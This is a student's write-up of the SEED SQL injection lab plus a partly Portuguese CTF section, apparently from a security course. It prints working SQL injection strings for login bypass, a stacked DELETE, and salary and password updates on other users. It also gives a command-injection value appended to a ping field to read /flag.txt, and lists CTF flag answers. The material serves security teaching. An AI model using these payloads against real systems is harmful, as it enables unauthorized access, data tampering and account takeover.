## Lab Environment
    - dockps
        ed7c62538f7f  mysql-10.9.0.6
        0dc3b8bf0785  www-10.9.0.5


## Lab Tasks

# Task 1: Get Familiar with SQL Statements

    - https://drive.google.com/file/d/1GZE7e5K6og2KzVIbffWSJs59_YHOtGaZ/view?usp=sharing 

# Task 2: SQL Injection Attack on SELECT Statement

    - Task 2.1: SQL Injection Attack from webpage
        - https://drive.google.com/file/d/1kGqLOi1kdBj_e0rOBxq-7kRs_rwH5w02/view?usp=sharing
        - https://drive.google.com/file/d/1hq-j5KMkxaKZH_tWNPGyRbPO-FKq05mM/view?usp=sharing 
        - The code and query are vulnerable because the input is not properly sanitized, user input and query get compiled and ran at the "same time". This is easily exploitable using a single quote to get out of query's input field and a "#" to comment the rest of the line
    
    - Task 2.2: SQL Injection Attack from command line
        - https://drive.google.com/file/d/1EEMadUpea_aKgnZ34YNAX5_G9JWRIVm-/view?usp=sharing
        - https://drive.google.com/file/d/1hnhaZ-fY-oh1ILCelVQV5fwa6fR-C7K3/view?usp=sharing
        - https://drive.google.com/file/d/1ub7xwSA4qMAxJIlkU1xN2nWfkXwlQDzE/view?usp=sharing
        - Same but via terminal (using curl) curl 'www.seed-server.com/unsafe_home.php?username=admin%27%20%23' %27 is the single quote, %20 the space and %23 the #.
    
    - Task 2.3: Append a new SQL Statement
        - Tried this username: ' 1=1;Delete from credential where name='Ted';#
        - Result: https://drive.google.com/file/d/1i7fMuqVHKzzilF58RU_gCS_fgn6Ex8ht/view?usp=sharing
        - Motive: This was expected to fail, because this site has a countermeauser to prevent us from running two SQL statements in one attack. The unsafe_home.php file only allows one SQL statement in this attack. To change this we could enter a new line of code between lines 75 and 76 with this 'echo "$sql";'. This allows the code to tun one more SQL statement before the if clause on line 76, allowing us to delete what we wanted.

# Task 3: SQL Injection Attack on UPDATE Statement

    - Task 3.1: Modify your own salary
        - Step 1: https://drive.google.com/file/d/1TsOkVgfXRs7_MhNs69CnM2l85y8S56wW/view?usp=sharing
        - Step 2: https://drive.google.com/file/d/1HEL4EffKQDecJozZQuTawa-joZW4x8m4/view?usp=sharing  ( ',salary=70000 where EID=10000;# )
        - Step 3: https://drive.google.com/file/d/12xA4UbFF5p0rvPiNBabOx7Y8NZjxLuk5/view?usp=sharing 

    - Task 3.2: Modify other people' salary
        - https://drive.google.com/file/d/1urUsDSozwFWg-gzU16UWFL_Nn3_FrVbP/view?usp=sharing
        - https://drive.google.com/file/d/14L-J2hNiygkvfoUiwDbicvaX8_eG0Kyn/view?usp=sharing
    
    - Task 3.3: Modify other people' password
        - New password: https://drive.google.com/file/d/14L-J2hNiygkvfoUiwDbicvaX8_eG0Kyn/view?usp=sharing 
        - https://drive.google.com/file/d/1YG8IIBItkdnQl0PCtCeTR5_TBao3nznP/view?usp=sharing  ( ',password='2682d74b055524cc455c964baff1f236fc89f94e' where name='Boby';# )
        - https://drive.google.com/file/d/1tGKDjpbo9WPRersOXuJPbuT3yj6w0hIq/view?usp=sharing 
        - The password was successfully changed to the new password in the database.


## CTF8

    - Desafio 1
        - username: admin." ' or true--
        - password: true --
        - flag: flag{078e65ed99471886b1aab629b2666777}

    - Desafio 2
        - Que funcionalidades é que estão acessiveis a um utilizador sem este estar autenticado?
            Ver a velocidade da conexão à internet -"Check my network speed", obter um speedtest result e fazer ping a um host.

        - Das funcionalidade que identificaste e do feedback que tiveste da sua utilização, pensa como é que estas podem estar implementatadas no servidor. Será que estão a utilizar algum utilitário linux?
            Sim, para fazer ping a um host o servidor utiliza o comando linux "ping".

        - Se sim, que vulnerabilidades podem estar presentes na chamada deste utilitário?
            O código em php faz um exec('ping '. (..)) que podemos tentar modificar, utilizando as vulnerabilidades do exec.
        
        - Verifica se existe alguma vulnerabilidade nesta funcionalidade.
            Correr o comando: '8.8.8.8; cat /flag.txt' 

        - Identificada a vulnerabilidade, utiliza-a para aceder à flag que se encontra no ficheiro /flag.txt.
            flag: flag{06d2a537a9e4d1e3eaac309f67fad3c3} 
            



